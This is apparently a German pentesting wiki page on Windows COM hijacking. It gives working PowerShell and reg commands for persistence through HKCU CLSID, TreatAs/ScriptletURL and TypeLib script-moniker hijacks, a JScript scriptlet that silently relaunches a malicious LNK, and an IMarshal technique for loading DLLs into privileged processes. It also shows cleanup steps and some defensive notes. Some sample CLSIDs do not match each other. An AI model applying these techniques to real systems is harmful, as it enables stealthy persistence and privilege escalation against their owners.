# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Nach nicht vorhandenen COM-Komponenten suchen

Da die Werte in HKCU von Benutzern geändert werden können, lässt sich **COM Hijacking** als **Persistenzmechanismus** verwenden. Mit `procmon` lassen sich einfach gesuchte COM-Registrierungsschlüssel finden, die noch nicht existieren und von einem Angreifer erstellt werden könnten. Klassische Filter:

- **RegOpenKey**-Operationen.
- bei denen das _Result_ **NAME NOT FOUND** lautet.
- und der _Path_ mit **InprocServer32** endet.

Nützliche Varianten bei der Suche:

- Suche auch nach fehlenden **`LocalServer32`**-Schlüsseln. Einige COM-Klassen sind Out-of-Process-Server und starten eine vom Angreifer kontrollierte EXE statt einer DLL.
- Suche zusätzlich zu `InprocServer32` nach **`TreatAs`**- und **`ScriptletURL`**-Registrierungsvorgängen. In aktuellen Erkennungsregeln und Malware-Analysen wird immer wieder darauf hingewiesen, da diese deutlich seltener als normale COM-Registrierungen und daher besonders aussagekräftig sind.
- Übernimm beim Klonen einer Registrierung in HKCU das legitime **`ThreadingModel`** aus dem ursprünglichen `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`. Ein falsches Modell verhindert häufig die Aktivierung und macht den Hijack auffällig.<sup>[[3]](#references)</sup>
- Untersuche auf 64-Bit-Systemen sowohl die 64-Bit- als auch die 32-Bit-Ansicht (`procmon.exe` vs. `procmon64.exe`, `HKLM\Software\Classes` und `HKLM\Software\Classes\WOW6432Node`), da 32-Bit-Anwendungen möglicherweise eine andere COM-Registrierung auflösen.

Nachdem du dich entschieden hast, welche nicht vorhandene COM-Komponente du imitieren möchtest, führe die folgenden Befehle aus. _Sei vorsichtig, wenn du eine COM-Komponente imitieren möchtest, die alle paar Sekunden geladen wird, da das übertrieben sein könnte._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Hijackbare COM-Komponenten der Aufgabenplanung

Windows-Aufgaben verwenden Custom Triggers, um COM-Objekte aufzurufen. Da sie über die Aufgabenplanung ausgeführt werden, lässt sich leichter vorhersagen, wann sie ausgelöst werden.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Anhand der Ausgabe können Sie beispielsweise eine Aufgabe auswählen, die **bei jeder Benutzeranmeldung** ausgeführt wird.

Wenn Sie nun in **HKEY\CLASSES\ROOT\CLSID** sowie in HKLM und HKCU nach der CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** suchen, werden Sie normalerweise feststellen, dass der Wert in HKCU nicht existiert.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Dann kannst du einfach den HKCU-Eintrag erstellen, und jedes Mal, wenn sich der Benutzer anmeldet, wird deine Backdoor ausgeführt.

## Verwaiste COM-Registrierungen und Custom Marshaling

Eine systemweite COM-Registrierung kann zu einer DLL-Planting-Möglichkeit werden, ohne dass die Registry geändert werden muss. Suche nach einem `InprocServer32`-Wert, dessen DLL fehlt und dessen endgültiger Pfad von einem Benutzer mit geringen Berechtigungen erstellt oder geändert werden kann. Wird eine DLL mit exakt diesem Namen platziert, lädt jeder Prozess, der die CLSID aktiviert, den Angreifercode. Im CrossDevice-Beispiel lautete der registrierte Pfad `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, sodass ein Standardbenutzer das fehlende Unterverzeichnis und die DLL erstellen konnte.<sup>[[5]](#references)</sup>

### `IMarshal` als prozessübergreifender DLL-Ladevektor

COM stellt einen Schnittstellenzeiger normalerweise mit einem standardmäßigen `OBJREF` dar, der den Empfänger an das ursprüngliche Objekt verweist. Ein Objekt, das `IMarshal` implementiert, kann stattdessen ein benutzerdefiniertes `OBJREF` erzeugen. Seine Methode `GetUnmarshalClass` liefert die CLSID des Codes, der das Objekt im empfangenden Prozess rekonstruiert. Diese CLSID muss nicht das ursprüngliche Objekt identifizieren. COM löst sie als In-Process-Server auf und lädt die registrierte DLL, bevor die angeforderte Schnittstellenmethode aufgerufen wird.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Eine minimale bösartige Implementierung muss lediglich die verwaiste CLSID in `GetUnmarshalClass` einsetzen.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Dieses Objekt über einen proxied Methodenparameter wie `[in] IUnknown *` senden. Eine weitere Möglichkeit ist `CoGetInstanceFromIStorage`; dabei muss das custom-marshaled Objekt außerdem `IStorage` ausreichend implementieren, um die lokalen Prüfungen zu bestehen. Das automatische Unmarshaling auf dem Remote-Server löst die ersetzte CLSID auf, sodass die DLL geladen wird, bevor die Zielmethode ausgeführt wird.<sup>[[5]](#references)</sup>

Dieses Primitive ist nicht auf fehlende Registrierungen beschränkt. Es kann den Empfänger auch dazu zwingen, eine vorhandene Custom-Unmarshaler-DLL zu laden und Fehler in deren Lade- oder Unmarshaling-Pfad offenzulegen.<sup>[[5]](#references)</sup>

Die Kette setzt alle folgenden Bedingungen voraus:<sup>[[5]](#references)</sup>

1. Eine maschinenweit sichtbare CLSID verweist auf eine fehlende oder ersetzbare In-Process-DLL.
2. Der Angreifer kann diese DLL am aufgelösten Pfad ablegen.
3. Ein aktivierbarer Out-of-Process-COM-Server läuft mit der gewünschten Berechtigungsstufe.
4. Der Server akzeptiert Custom Marshaling und stellt einen proxied Aufruf bereit, der das Angreiferobjekt über die Prozessgrenze hinweg überträgt.

### Nicht mehr vorhandene In-Process-Server finden

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) und [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) können die maschinenweite COM-Datenbank enumerieren und jeden Server mithilfe der normalen Win32-Modulauflösung testen. Das ist `Test-Path` vorzuziehen, da manche Registrierungen nur einen Dateinamen enthalten und sich auf den Suchpfad des Loaders stützen.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Behandle das Ergebnis als Kandidatenliste, nicht als Beweis für die Ausnutzbarkeit. Löse den Pfad so auf, wie es der Loader tut, und prüfe die DACL des ersten vorhandenen übergeordneten Verzeichnisses sowie die der vorgesehenen DLL, falls diese bereits existiert. Eine fehlende Datei ist nur dann relevant, wenn der Angreifer den Pfad erstellen oder ersetzen kann, den COM tatsächlich auflösen wird.<sup>[[5]](#references)</sup>

### Einen privilegierten Empfänger auswählen und starten

Untersuche mögliche COM-Klassen auf `RunAs`, Dienstzugehörigkeit, verfügbare Schnittstellen und RPC-Proxys. Eine für `SYSTEM` konfigurierte Klasse, die keinem benannten Dienst zugeordnet ist, lässt sich möglicherweise nicht direkt aktivieren, weil RPCSS sie nicht starten kann. Suche in diesem Fall nach einem nicht privilegierten Auslöser, der ihren Host startet, etwa einer ausführbaren geplanten Aufgabe, und stelle alle benannten Ereignisse oder IPC-Voraussetzungen wieder her, die den Server am Laufen halten.<sup>[[5]](#references)</sup>

Beispielsweise startete die anfällige Shell-Create-Object-Handler-Kette ihren Host, indem sie vor dem Aufruf einer vom Benutzer ausführbaren geplanten Aufgabe das erwartete globale Ereignis erstellte.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Ordne die resultierende Objektreferenz ihrem Host zu und überprüfe sowohl die Identität als auch die Marshaling-Richtlinie. Enumeriere anschließend die Schnittstellen und wandle ihre Proxys in IDL um, um einen Eingabeparameter wie `IUnknown *` zu finden, der das gefälschte Objekt marshalt.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Schutzmaßnahmen für Custom-Marshaling

Ein geeigneter Empfänger darf nicht vertrauenswürdige Custom-Marshaler nicht ablehnen. Zwei prozessweite Schutzmaßnahmen sind `EOAC_NO_CUSTOM_MARSHAL` in den an `CoInitializeSecurity` übergebenen Capabilities und `COMGLB_UNMARSHALING_POLICY_STRONG`, gesetzt über `IGlobalOptions::Set`. Mit Symbols lässt sich der entsprechende Status in `combase!gCapabilities` und `combase!g_GLBOPT_UnmarshalingPolicy` überprüfen; NtObjectManager gibt das Ergebnis als `CustomMarshalAllowed` aus, sofern sein Prozess-Parser den Windows-Build unterstützt.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` ermöglicht es, eine CLSID durch eine andere zu emulieren.<sup>[[4]](#references)</sup> Aus offensiver Sicht bedeutet dies, dass du die ursprüngliche CLSID unverändert lassen, eine zweite CLSID pro Benutzer erstellen kannst, die auf `scrobj.dll` verweist, und anschließend das reale COM-Objekt mit `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` auf das bösartige Objekt umleiten kannst.

Das ist nützlich, wenn:

- die Zielanwendung bereits beim Anmelden oder beim Start der Anwendung eine stabile CLSID instanziiert
- du eine reine Registry-Umleitung möchtest, statt den ursprünglichen `InprocServer32` zu ersetzen
- du über den Wert `ScriptletURL` ein lokales oder entferntes `.sct`-Scriptlet ausführen möchtest

Beispielablauf (angepasst an die Vorgehensweisen aus dem öffentlichen Atomic Red Team und älteren Untersuchungen zum Missbrauch der COM-Registry):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Notes:

- `scrobj.dll` liest den Wert `ScriptletURL` und führt die referenzierte `.sct` aus. Daher kann die Payload als lokale Datei gespeichert oder per HTTP/HTTPS remote abgerufen werden.
- `TreatAs` ist besonders nützlich, wenn die ursprüngliche COM-Registrierung in HKLM vollständig und stabil ist, da dann nur eine kleine benutzerspezifische Umleitung erforderlich ist, statt den gesamten Baum zu spiegeln.
- Zur Validierung ohne Warten auf den natürlichen Trigger kannst du den gefälschten ProgID/CLSID manuell mit `rundll32.exe -sta <ProgID-or-CLSID>` instanziieren, sofern die Zielklasse STA-Aktivierung unterstützt.

## COM TypeLib Hijacking (script: moniker persistence)

Typbibliotheken (TypeLib) definieren COM-Schnittstellen und werden über `LoadTypeLib()` geladen. Wenn ein COM-Server instanziiert wird, lädt das Betriebssystem möglicherweise auch die zugehörige TypeLib, indem es die Registrierungsschlüssel unter `HKCR\TypeLib\{LIBID}` abfragt. Wird der Pfad der TypeLib durch einen **moniker** ersetzt, z. B. `script:C:\...\evil.sct`, führt Windows das Scriptlet aus, wenn die TypeLib aufgelöst wird – so entsteht eine unauffällige Persistenz, die ausgelöst wird, wenn gängige Komponenten verwendet werden.

Dies wurde beim Microsoft-Webbrowser-Steuerelement beobachtet (das häufig von Internet Explorer, Apps mit eingebettetem WebBrowser und sogar `explorer.exe` geladen wird).<sup>[[1]](#references)[[2]](#references)</sup>

### Schritte (PowerShell)

1) Ermittle die TypeLib (LIBID), die von einer häufig verwendeten CLSID genutzt wird. Beispiel für eine CLSID, die oft in Malware-Ketten missbraucht wird: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft-Webbrowser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Verweise den benutzerspezifischen TypeLib-Pfad mithilfe des `script:`-Monikers auf ein lokales Scriptlet (keine Administratorrechte erforderlich):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Lege eine minimale JScript-`.sct` ab, die deine primäre Payload (z. B. eine `.lnk`, die von der initialen Kette verwendet wird) erneut startet:

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Auslösen – Das Öffnen von IE, einer Anwendung, die das WebBrowser-Steuerelement einbettet, oder sogar gewöhnliche Explorer-Aktivitäten laden die TypeLib und führen das Scriptlet aus, wodurch deine Kette bei der Anmeldung/beim Neustart erneut aktiviert wird.

Bereinigung
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Hinweise
- Dieselbe Logik lässt sich auf andere häufig verwendete COM-Komponenten anwenden; löse immer zuerst die echte `LIBID` aus `HKCR\CLSID\{CLSID}\TypeLib` auf.
- Auf 64-Bit-Systemen kannst du auch den Unterschlüssel `win64` für 64-Bit-Consumer anlegen.

## References

- [1] [Die TypeLib hijacken – Eine neue COM-Persistenztechnik (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine-Kampagne: Eine ausgeklügelte Phishing-Attacke gegen US-amerikanische Unternehmen](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [COM-Hijacking neu betrachtet (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID-Schlüssel (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero – Windows-Exploitation-Techniken: Verwaiste COM-Objektregistrierungen](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn – IMarshal-Schnittstelle](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications – MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
{{#include ../../banners/hacktricks-training.md}}

